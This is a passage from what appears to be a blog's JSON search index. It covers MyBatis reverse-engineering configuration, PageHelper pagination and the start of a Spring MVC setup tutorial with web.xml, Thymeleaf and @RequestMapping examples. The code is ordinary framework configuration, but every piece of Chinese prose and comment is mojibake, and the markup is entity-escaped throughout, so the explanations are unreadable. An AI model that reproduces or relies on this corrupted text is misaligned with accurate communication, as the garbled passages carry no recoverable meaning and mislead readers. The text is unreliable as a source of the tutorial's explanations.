å°„æ–‡ä»¶çš„ç”Ÿæˆç­–ç•¥ --\u0026gt; \u0026lt;sqlMapGenerator targetPackage=\u0026#34;com.reus.mybatis.mapper\u0026#34; targetProject=\u0026#34;./src/main/resources\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/sqlMapGenerator\u0026gt; \u0026lt;!-- Mapperæ¥å£çš„ç”Ÿæˆç­–ç•¥ --\u0026gt; \u0026lt;javaClientGenerator type=\u0026#34;XMLMAPPER\u0026#34; targetPackage=\u0026#34;com.reus.mybatis.mapper\u0026#34; targetProject=\u0026#34;./src/main/java\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/javaClientGenerator\u0026gt; \u0026lt;!-- é€†å‘åˆ†æçš„è¡¨ --\u0026gt; \u0026lt;!-- tableNameè®¾ç½®ä¸º*å·ï¼Œå¯ä»¥å¯¹åº”æ‰€æœ‰è¡¨ï¼Œæ­¤æ—¶ä¸å†™domainObjectName --\u0026gt; \u0026lt;!-- domainObjectNameå±æ€§æŒ‡å®šç”Ÿæˆå‡ºæ¥çš„å®ä½“ç±»çš„ç±»å --\u0026gt; \u0026lt;table tableName=\u0026#34;t_emp\u0026#34; domainObjectName=\u0026#34;Emp\u0026#34;/\u0026gt; \u0026lt;table tableName=\u0026#34;t_dept\u0026#34; domainObjectName=\u0026#34;Dept\u0026#34;/\u0026gt; \u0026lt;/context\u0026gt; \u0026lt;/generatorConfiguration\u0026gt; è¿è¡Œç»“æœ\n10 é…ç½®åˆ†é¡µæ’ä»¶ pom.xmlæ·»åŠ ä¾èµ–\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/com.github.pagehelper/pagehelper --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.2.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; åœ¨MyBatisçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼ˆmybatis-config.xmlï¼‰ä¸­é…ç½®æ’ä»¶\n1 2 3 4 \u0026lt;plugins\u0026gt; \u0026lt;!--è®¾ç½®åˆ†é¡µæ’ä»¶--\u0026gt; \u0026lt;plugin interceptor=\u0026#34;com.github.pagehelper.PageInterceptor\u0026#34;\u0026gt;\u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; ä½¿ç”¨\nåœ¨æŸ¥è¯¢åŠŸèƒ½ä¹‹å‰ä½¿ç”¨PageHelper.startPage(int pageNum, int pageSize)å¼€å¯åˆ†é¡µåŠŸèƒ½ pageNumï¼šå½“å‰é¡µçš„é¡µç  pageSizeï¼šæ¯é¡µæ˜¾ç¤ºçš„æ¡æ•° 1 2 3 4 5 6 EmpMapper mapper = sqlSession.getMapper(EmpMapper.class); //è®¿é—®ç¬¬ä¸€é¡µï¼Œæ¯é¡µå››æ¡æ•°æ® PageHelper.startPage(1,4); List\u0026lt;Emp\u0026gt; emps = mapper.selectByExample(null); emps.forEach(System.out::println); } åœ¨æŸ¥è¯¢è·å–listé›†åˆä¹‹åï¼Œä½¿ç”¨PageInfo\u0026lt;T\u0026gt; pageInfo = new PageInfo\u0026lt;\u0026gt;(List\u0026lt;T\u0026gt; list, intnavigatePages)è·å–åˆ†é¡µç›¸å…³æ•°æ®\nlistï¼šåˆ†é¡µä¹‹åçš„æ•°æ® navigatePagesï¼šå¯¼èˆªåˆ†é¡µçš„é¡µç æ•° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 @Test public void testPageHelper() throws IOException { InputStream is = Resources.getResourceAsStream(\u0026#34;mybatis-config.xml\u0026#34;); SqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder(); SqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is); SqlSession sqlSession = sqlSessionFactory.openSession(true); EmpMapper mapper = sqlSession.getMapper(EmpMapper.class); PageHelper.startPage(1, 4); List\u0026lt;Emp\u0026gt; emps = mapper.selectByExample(null); PageInfo\u0026lt;Emp\u0026gt; page = new PageInfo\u0026lt;\u0026gt;(emps,5); System.out.println(page); } ç»“æœï¼š\n1 2 3 4 5 PageInfo{ pageNum=1, pageSize=4, size=4, startRow=1, endRow=4, total=8, pages=2, list=Page{count=true, pageNum=1, pageSize=4, startRow=0, endRow=4, total=8, pages=2, reasonable=false, pageSizeZero=false} [Emp{eid=1, empName=\u0026#39;admin\u0026#39;, age=22, sex=\u0026#39;ç”·\u0026#39;, email=\u0026#39;456@qq.com\u0026#39;, did=3}, Emp{eid=2, empName=\u0026#39;admin2\u0026#39;, age=22, sex=\u0026#39;ç”·\u0026#39;, email=\u0026#39;456@qq.com\u0026#39;, did=3}, Emp{eid=3, empName=\u0026#39;ç‹äº”\u0026#39;, age=12, sex=\u0026#39;å¥³\u0026#39;, email=\u0026#39;123@qq.com\u0026#39;, did=3}, Emp{eid=4, empName=\u0026#39;èµµå…­\u0026#39;, age=32, sex=\u0026#39;ç”·\u0026#39;, email=\u0026#39;123@qq.com\u0026#39;, did=1}], prePage=0, nextPage=2, isFirstPage=true, isLastPage=false, hasPreviousPage=false, hasNextPage=true, navigatePages=5, navigateFirstPage=1, navigateLastPage=2, navigatepageNums=[1, 2]} å¸¸ç”¨æ•°æ® pageNumï¼šå½“å‰é¡µçš„é¡µç  pageSizeï¼šæ¯é¡µæ˜¾ç¤ºçš„æ¡æ•° sizeï¼šå½“å‰é¡µæ˜¾ç¤ºçš„çœŸå®æ¡æ•° totalï¼šæ€»è®°å½•æ•° pagesï¼šæ€»é¡µæ•° prePageï¼šä¸Šä¸€é¡µçš„é¡µç  nextPageï¼šä¸‹ä¸€é¡µçš„é¡µç  isFirstPage/isLastPageï¼šæ˜¯å¦ä¸ºç¬¬ä¸€é¡µ/æœ€åä¸€é¡µ hasPreviousPage/hasNextPageï¼šæ˜¯å¦å­˜åœ¨ä¸Šä¸€é¡µ/ä¸‹ä¸€é¡µ navigatePagesï¼šå¯¼èˆªåˆ†é¡µçš„é¡µç æ•° navigatepageNumsï¼šå¯¼èˆªåˆ†é¡µçš„é¡µç ï¼Œ[1,2,3,4,5] ","permalink":"http://www.reus09.top/posts/tech/mybatis/","summary":"MyBatis è¿™é‡Œæ•´ç†äº†MyBatisçš„å¸¸è§ç”¨æ³• Mybatis ä¸»è¦å¯¹æ•°æ®åº“çš„æ“ä½œæä¾›äº†ç»„ä»¶ 1 ç¯å¢ƒæ­å»º å¯¼å…¥ä¾èµ– 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!-- Mybatisæ ¸å¿ƒ --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt;","title":"Mybatis"},{"content":"Spring-mvc æœ¬ç¯‡ä¸»è¦å¯¹spring-mvcçš„çŸ¥è¯†ç‚¹è¿›è¡Œæ€»ç»“\nMVCçš„å·¥ä½œæµç¨‹ï¼š\nç”¨æˆ·é€šè¿‡è§†å›¾å±‚å‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨ä¸­è¯·æ±‚è¢«Controlleræ¥æ”¶ï¼ŒControllerè°ƒç”¨ç›¸åº”çš„Modelå±‚å¤„ç†è¯·æ±‚ï¼Œå¤„ç†å®Œæ¯•å°†ç»“æœè¿”å›åˆ°Controllerï¼ŒControllerå†æ ¹æ®è¯·æ±‚å¤„ç†çš„ç»“æœæ‰¾åˆ°ç›¸åº”çš„Viewè§†å›¾ï¼Œæ¸²æŸ“æ•°æ®åæœ€ç»ˆå“åº”ç»™æµè§ˆå™¨ SpringMVCå·¥ä½œæµç¨‹\næµè§ˆå™¨å‘é€è¯·æ±‚ï¼Œè‹¥è¯·æ±‚åœ°å€ç¬¦åˆå‰ç«¯æ§åˆ¶å™¨çš„url-patternï¼Œè¯¥è¯·æ±‚å°±ä¼šè¢«å‰ç«¯æ§åˆ¶å™¨DispatcherServletå¤„ç†ã€‚ å‰ç«¯æ§åˆ¶å™¨ä¼šè¯»å–SpringMVCçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼Œé€šè¿‡æ‰«æç»„ä»¶æ‰¾åˆ°æ§åˆ¶å™¨ï¼Œå°†è¯·æ±‚åœ°å€å’Œæ§åˆ¶å™¨ä¸­@RequestMappingæ³¨è§£çš„valueå±æ€§å€¼è¿›è¡ŒåŒ¹é… è‹¥åŒ¹é…æˆåŠŸï¼Œè¯¥æ³¨è§£æ‰€æ ‡è¯†çš„æ§åˆ¶å™¨æ–¹æ³•å°±æ˜¯å¤„ç†è¯·æ±‚çš„æ–¹æ³•ã€‚å¤„ç†è¯·æ±‚çš„æ–¹æ³•éœ€è¦è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„è§†å›¾åç§°ï¼Œè¯¥è§†å›¾åç§°ä¼šè¢«è§†å›¾è§£æå™¨è§£æï¼ŒåŠ ä¸Šå‰ç¼€å’Œåç¼€ç»„æˆè§†å›¾çš„è·¯å¾„ï¼Œé€šè¿‡Thymeleafå¯¹è§†å›¾è¿›è¡Œæ¸²æŸ“ï¼Œæœ€ç»ˆè½¬å‘åˆ°è§†å›¾æ‰€å¯¹åº”é¡µé¢ è½¬å‘å’Œé‡å®šå‘åŒºåˆ«\nforwardï¼ˆè½¬å‘ï¼‰ï¼š\næ˜¯æœåŠ¡å™¨è¯·æ±‚èµ„æº,æœåŠ¡å™¨ç›´æ¥è®¿é—®ç›®æ ‡åœ°å€çš„URL,æŠŠé‚£ä¸ªURLçš„å“åº”å†…å®¹è¯»å–è¿‡æ¥,ç„¶åæŠŠè¿™äº›å†…å®¹å†å‘ç»™æµè§ˆå™¨.æµè§ˆå™¨æ ¹æœ¬ä¸çŸ¥é“æœåŠ¡å™¨å‘é€çš„å†…å®¹ä»å“ªé‡Œæ¥çš„,å› ä¸ºè¿™ä¸ªè·³è½¬è¿‡ç¨‹å®åœ¨æœåŠ¡å™¨å®ç°çš„ï¼Œå¹¶ä¸æ˜¯åœ¨å®¢æˆ·ç«¯å®ç°çš„æ‰€ä»¥å®¢æˆ·ç«¯å¹¶ä¸çŸ¥é“è¿™ä¸ªè·³è½¬åŠ¨ä½œï¼Œæ‰€ä»¥å®ƒçš„åœ°å€æ è¿˜æ˜¯åŸæ¥çš„åœ°å€.\nredirectï¼ˆé‡å®šå‘ï¼‰ï¼š\næ˜¯æœåŠ¡ç«¯æ ¹æ®é€»è¾‘,å‘é€ä¸€ä¸ªçŠ¶æ€ç ,å‘Šè¯‰æµè§ˆå™¨é‡æ–°å»è¯·æ±‚é‚£ä¸ªåœ°å€.æ‰€ä»¥åœ°å€æ æ˜¾ç¤ºçš„æ˜¯æ–°çš„URL.\nè½¬å‘æ˜¯æœåŠ¡å™¨è¡Œä¸ºï¼Œé‡å®šå‘æ˜¯å®¢æˆ·ç«¯è¡Œä¸ºã€‚\n1 é…ç½®ç¯å¢ƒ ç›¸å…³ä¾èµ–\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-webmvc\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.3.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; åœ¨web.xmlé‡Œé¢é…ç½®springMVCçš„ç»„ä»¶ï¼Œè¿˜æœ‰è¿‡æ»¤å™¨ï¼Œ å¯¹SpringMVCçš„é…ç½®æ–‡ä»¶:web.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;!--é…ç½®springMVCçš„ç¼–ç è¿‡æ»¤å™¨--\u0026gt; \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;CharacterEncodingFilter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.springframework.web.filter.CharacterEncodingFilter\u0026lt;/filter-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;encoding\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;UTF-8\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;forceResponseEncoding\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;true\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;CharacterEncodingFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;!-- é…ç½®SpringMVCçš„å‰ç«¯æ§åˆ¶å™¨ï¼Œå¯¹æµè§ˆå™¨å‘é€çš„è¯·æ±‚ç»Ÿä¸€è¿›è¡Œå¤„ç† --\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;springMVC\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.springframework.web.servlet.DispatcherServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;!-- é€šè¿‡åˆå§‹åŒ–å‚æ•°æŒ‡å®šSpringMVCé…ç½®æ–‡ä»¶çš„ä½ç½®å’Œåç§° --\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;!-- contextConfigLocationä¸ºå›ºå®šå€¼ --\u0026gt; \u0026lt;param-name\u0026gt;contextConfigLocation\u0026lt;/param-name\u0026gt; \u0026lt;!-- ä½¿ç”¨classpath:è¡¨ç¤ºä»ç±»è·¯å¾„æŸ¥æ‰¾é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚mavenå·¥ç¨‹ä¸­çš„src/main/resources --\u0026gt; \u0026lt;param-value\u0026gt;classpath:springMVC.xml\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;!-- ä½œä¸ºæ¡†æ¶çš„æ ¸å¿ƒç»„ä»¶ï¼Œåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­æœ‰å¤§é‡çš„åˆå§‹åŒ–æ“ä½œè¦åš è€Œè¿™äº›æ“ä½œæ”¾åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶æ‰æ‰§è¡Œä¼šä¸¥é‡å½±å“è®¿é—®é€Ÿåº¦ å› æ­¤éœ€è¦é€šè¿‡æ­¤æ ‡ç­¾å°†å¯åŠ¨æ§åˆ¶DispatcherServletçš„åˆå§‹åŒ–æ—¶é—´æå‰åˆ°æœåŠ¡å™¨å¯åŠ¨æ—¶ --\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;springMVC\u0026lt;/servlet-name\u0026gt; \u0026lt;!-- è®¾ç½®springMVCçš„æ ¸å¿ƒæ§åˆ¶å™¨æ‰€èƒ½å¤„ç†çš„è¯·æ±‚çš„è¯·æ±‚è·¯å¾„ /æ‰€åŒ¹é…çš„è¯·æ±‚å¯ä»¥æ˜¯/loginæˆ–.htmlæˆ–.jsæˆ–.cssæ–¹å¼çš„è¯·æ±‚è·¯å¾„ ä½†æ˜¯/ä¸èƒ½åŒ¹é….jspè¯·æ±‚è·¯å¾„çš„è¯·æ±‚ --\u0026gt; \u0026lt;url-pattern\u0026gt;/\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; æ³¨ï¼š\n\u0026lt;url-pattern\u0026gt;æ ‡ç­¾ä¸­ä½¿ç”¨/å’Œ/*çš„åŒºåˆ«ï¼š\n/æ‰€åŒ¹é…çš„è¯·æ±‚å¯ä»¥æ˜¯/loginæˆ–.htmlæˆ–.jsæˆ–.cssæ–¹å¼çš„è¯·æ±‚è·¯å¾„ï¼Œä½†æ˜¯/ä¸èƒ½åŒ¹é….jspè¯·æ±‚è·¯å¾„çš„è¯·æ±‚\nå› æ­¤å°±å¯ä»¥é¿å…åœ¨è®¿é—®jspé¡µé¢æ—¶ï¼Œè¯¥è¯·æ±‚è¢«DispatcherServletå¤„ç†ï¼Œä»è€Œæ‰¾ä¸åˆ°ç›¸åº”çš„é¡µé¢\n/*åˆ™èƒ½å¤ŸåŒ¹é…æ‰€æœ‰è¯·æ±‚ï¼Œä¾‹å¦‚åœ¨ä½¿ç”¨è¿‡æ»¤å™¨æ—¶ï¼Œè‹¥éœ€è¦å¯¹æ‰€æœ‰è¯·æ±‚è¿›è¡Œè¿‡æ»¤ï¼Œå°±éœ€è¦ä½¿ç”¨/*çš„å†™æ³•\nspring-mvc.xmlé…ç½®æ–‡ä»¶\nè¿™é‡Œæ˜¯ä»¥è§£æå™¨ä¸ºthymeleaf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:context=\u0026#34;http://www.springframework.org/schema/context\u0026#34; xmlns:mvc=\u0026#34;http://www.springframework.org/schema/mvc\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd\u0026#34;\u0026gt; \u0026lt;!-- æ‰«æç»„ä»¶--\u0026gt; \u0026lt;context:component-scan base-package=\u0026#34;com.reus.springmvc\u0026#34;\u0026gt;\u0026lt;/context:component-scan\u0026gt; \u0026lt;!-- é…ç½®Thymeleafè§†å›¾è§£æå™¨ --\u0026gt; \u0026lt;bean id=\u0026#34;viewResolver\u0026#34; class=\u0026#34;org.thymeleaf.spring5.view.ThymeleafViewResolver\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;order\u0026#34; value=\u0026#34;1\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;characterEncoding\u0026#34; value=\u0026#34;UTF-8\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;templateEngine\u0026#34;\u0026gt; \u0026lt;bean class=\u0026#34;org.thymeleaf.spring5.SpringTemplateEngine\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;templateResolver\u0026#34;\u0026gt; \u0026lt;bean class=\u0026#34;org.thymeleaf.spring5.templateresolver.SpringResourceTemplateResolver\u0026#34;\u0026gt; \u0026lt;!-- è§†å›¾å‰ç¼€ --\u0026gt; \u0026lt;property name=\u0026#34;prefix\u0026#34; value=\u0026#34;/WEB-INF/templates/\u0026#34;/\u0026gt; \u0026lt;!-- è§†å›¾åç¼€ --\u0026gt; \u0026lt;property name=\u0026#34;suffix\u0026#34; value=\u0026#34;.html\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;templateMode\u0026#34; value=\u0026#34;HTML5\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;characterEncoding\u0026#34; value=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;!-- é…ç½®è§†å›¾æ§åˆ¶å™¨ --\u0026gt; \u0026lt;mvc:view-controller path=\u0026#34;/\u0026#34; view-name= \u0026#34;index\u0026#34; \u0026gt;\u0026lt;/mvc:view-controller\u0026gt; \u0026lt;!-- å¼€æ”¾å¯¹é™æ€èµ„æºçš„è®¿é—®--\u0026gt; \u0026lt;mvc:default-servlet-handler/\u0026gt; \u0026lt;!-- å¼€å¯ SpringMVC çš„ æ³¨è§£é©±åŠ¨ æ¯”å¦‚RequestMapping --\u0026gt; \u0026lt;mvc:annotation-driven/\u0026gt; \u0026lt;!-- é…ç½® æ–‡ä»¶ä¸Šä¼ è§£æå™¨ ï¼Œå°†ä¸Šä¼ çš„æ–‡ä»¶å°è£…ä¸ºMultipartFile--\u0026gt; \u0026lt;bean id= \u0026#34;multipartResolver\u0026#34; class=\u0026#34;org.springframework.web.multipart.commons.CommonsMultipartResolver\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; \u0026lt;!-- é…ç½®æ‹¦æˆªå™¨ --\u0026gt; \u0026lt;mvc:interceptors\u0026gt; \u0026lt;!-- \u0026lt;bean class=\u0026#34;com.reus.springmvc.interceptors.FirstInterceptor\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;mvc:interceptor\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;mvc:mapping path=\u0026#34;/*\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;mvc:exclude-mapping path=\u0026#34;/\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;ref bean=\u0026#34;firstInterceptor\u0026#34;\u0026gt;\u0026lt;/ref\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/mvc:interceptor\u0026gt;--\u0026gt; \u0026lt;ref bean=\u0026#34;firstInterceptor\u0026#34;\u0026gt;\u0026lt;/ref\u0026gt; \u0026lt;ref bean=\u0026#34;secondInterceptor\u0026#34;\u0026gt;\u0026lt;/ref\u0026gt; \u0026lt;/mvc:interceptors\u0026gt; \u0026lt;!-- é…ç½® å¼‚å¸¸å¤„ç† --\u0026gt; \u0026lt;bean class=\u0026#34;org.springframework.web.servlet.handler.SimpleMappingExceptionResolver\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;exceptionMappings\u0026#34;\u0026gt; \u0026lt;props\u0026gt; \u0026lt;prop key=\u0026#34;java.lang.ArithmeticException\u0026#34;\u0026gt;error\u0026lt;/prop\u0026gt; \u0026lt;/props\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!-- è®¾ç½®å°†å¼‚å¸¸ä¿¡æ¯å…±äº«åœ¨è¯·æ±‚åŸŸä¸­--\u0026gt; \u0026lt;property name=\u0026#34;exceptionAttribute\u0026#34; value=\u0026#34;ex\u0026#34;\u0026gt;\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 2 SpringMVCä¸­å¸¸ç”¨çš„æ ‡ç­¾ 2.1 @RequestingMapping RequestingMapping\n@RequestMappingæ³¨è§£çš„ä½œç”¨å°±æ˜¯å°†è¯·æ±‚å’Œå¤„ç†è¯·æ±‚çš„æ§åˆ¶å™¨æ–¹æ³•å…³è”èµ·æ¥ï¼Œå»ºç«‹æ˜ å°„å…³ç³»ã€‚\n@RequestMappingæ³¨è§£çš„valueå±æ€§æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„æ•°ç»„ï¼Œè¡¨ç¤ºè¯¥è¯·æ±‚æ˜ å°„èƒ½å¤ŸåŒ¹é…å¤šä¸ªè¯·æ±‚åœ°å€æ‰€å¯¹åº”çš„è¯·æ±‚ è¿™ä¸ªè¿›å…¥å¯ä»¥ç”¨åœ¨SpringMVC.xmlé‡Œé¢ç”¨é…ç½®çš„æ–¹å¼ä»£æ›¿ã€‚\n1 \u0026lt;mvc:view-controller path=\u0026#34;/\u0026#34; view-name= \u0026#34;index\u0026#34; \u0026gt;\u0026lt;/mvc:view-controller\u0026gt; ä½†æ˜¯å¼€å¯è¿™ä¸ªä¼šå¯¼è‡´å…¶ä»–æ ‡æ³¨çš„è¯·æ±‚æ˜ å°„å¤±æ•ˆï¼Œå› æ­¤éœ€è¦å¼€å¯mvcæ³¨è§£é©±åŠ¨ \u0026lt;mvc:annotation-driven /\u0026gt; @RequestMappingæ ‡è¯†ä¸€ä¸ªç±»ï¼šè®¾ç½®æ˜ å°„è¯·æ±‚çš„è¯·æ±‚è·¯å¾„çš„åˆå§‹ä¿¡æ¯\n@RequestMappingæ ‡è¯†ä¸€ä¸ªæ–¹æ³•ï¼šè®¾ç½®æ˜ å°„è¯·æ±‚è¯·æ±‚è·¯å¾„çš„å…·ä½“ä¿¡æ¯\n1 2 3 4 5 6 7 8 9 10 @Controller @RequestMapping(\u0026#34;/test\u0026#34;) public class RequestMappingController { //æ­¤æ—¶è¯·æ±‚æ˜ å°„æ‰€æ˜ å°„çš„è¯·æ±‚çš„è¯·æ±‚è·¯å¾„ä¸ºï¼š/test/testRequestMapping @RequestMapping(\u0026#34;/testRequestMapping\u0026#34;) public String testRequestMapping(){ return \u0026#34;success\u0026#34;; } } @RequestMappingæ³¨è§£çš„methodå±æ€§é€šè¿‡è¯·æ±‚çš„è¯·æ±‚æ–¹å¼ï¼ˆgetæˆ–postï¼‰åŒ¹é…è¯·æ±‚æ˜ å°„\n@RequestMappingæ³¨è§£çš„methodå±æ€§æ˜¯ä¸€ä¸ªRequestMethodç±»å‹çš„æ•°ç»„ï¼Œè¡¨ç¤ºè¯¥è¯·æ±‚æ˜ å°„èƒ½å¤ŸåŒ¹é…å¤šç§è¯·æ±‚æ–¹å¼çš„è¯·æ±‚\nè‹¥å½“å‰è¯·æ±‚çš„è¯·æ±‚åœ°å€æ»¡è¶³è¯·æ±‚æ˜ å°„çš„valueå±æ€§ï¼Œä½†æ˜¯è¯·æ±‚æ–¹å¼ä¸æ»¡è¶³methodå±æ€§ï¼Œåˆ™æµè§ˆå™¨æŠ¥é”™405ï¼šRequest method 'POST' not supported\n@RequestMappingæ³¨è§£çš„paramså±æ€§é€šè¿‡è¯·æ±‚çš„è¯·æ±‚å‚æ•°åŒ¹é…è¯·æ±‚æ˜ å°„\n@RequestMappingæ³¨è§£çš„paramså±æ€§æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„æ•°ç»„ï¼Œå¯ä»¥é€šè¿‡å››ç§è¡¨è¾¾å¼è®¾ç½®è¯·æ±‚å‚æ•°å’Œè¯·æ±‚æ˜ å°„çš„åŒ¹é…å…³ç³»\n\u0026quot;param\u0026quot;ï¼šè¦æ±‚è¯·æ±‚æ˜ å°„æ‰€åŒ¹é…çš„è¯·æ±‚å¿…é¡»æºå¸¦paramè¯·æ±‚å‚æ•° \u0026quot;!param\u0026quot;ï¼šè¦æ±‚è¯·æ±‚æ˜ å°„æ‰€åŒ¹é…çš„è¯·æ±‚å¿…é¡»ä¸èƒ½æºå¸¦paramè¯·æ±‚å‚æ•° \u0026quot;param=value\u0026quot;ï¼šè¦æ±‚è¯·æ±‚æ˜ å°„æ‰€åŒ¹é…çš„è¯·æ±‚å¿…é¡»æºå¸¦paramè¯·æ±‚å‚æ•°ä¸”param=value \u0026quot;param!=value\u0026quot;ï¼šè¦æ±‚è¯·æ±‚æ˜ å°„æ‰€åŒ¹é…çš„è¯·æ±‚å¿…é¡»æºå¸¦paramè¯·æ±‚å‚æ•°ä½†æ˜¯param!=value SpringMVCæ”¯æŒanté£æ ¼çš„è·¯å¾„\nï¼Ÿï¼šè¡¨ç¤ºä»»æ„çš„å•ä¸ªå­—ç¬¦\n*ï¼šè¡¨ç¤ºä»»æ„çš„0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦\n**ï¼šè¡¨ç¤ºä»»æ„çš„ä¸€å±‚æˆ–å¤šå±‚ç›®å½•\nåªèƒ½ä½¿ç”¨/**/xxxçš„æ–¹å¼ RequestMappingå ä½ç¬¦çš„ä½œç”¨\nSpringMVCè·¯å¾„ä¸­çš„å ä½ç¬¦å¸¸ç”¨äºRESTfulé£æ ¼ä¸­ï¼Œå½“è¯·æ±‚è·¯å¾„ä¸­å°†æŸäº›æ•°æ®é€šè¿‡è·¯å¾„çš„æ–¹å¼ä¼ è¾“åˆ°æœåŠ¡å™¨ä¸­ï¼Œå°±å¯ä»¥åœ¨ç›¸åº”çš„@RequestMappingæ³¨è§£çš„valueå±æ€§ä¸­é€šè¿‡å ä½ç¬¦{xxx}è¡¨ç¤ºä¼ è¾“çš„æ•°æ®ï¼Œåœ¨é€šè¿‡@PathVariableæ³¨è§£ï¼Œå°†å ä½ç¬¦æ‰€è¡¨ç¤ºçš„æ•°æ®èµ‹å€¼ç»™æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚\n1 2 3 4 5 6 @RequestMapping(\u0026#34;/testRest/{id}/{username}\u0026#34;) public String testRest(@PathVariable(\u0026#34;id\u0026#34;) String id, @PathVariable(\u0026#34;username\u0026#34;) String username){ System.out.println(\u0026#34;id:\u0026#34;+id+\u0026#34;,username:\u0026#34;+username); return \u0026#34;success\u0026#34;; } //æœ€ç»ˆè¾“å‡ºçš„å†…å®¹ä¸º--\u0026gt;id:1,username:admin 2.2 @RequestParam 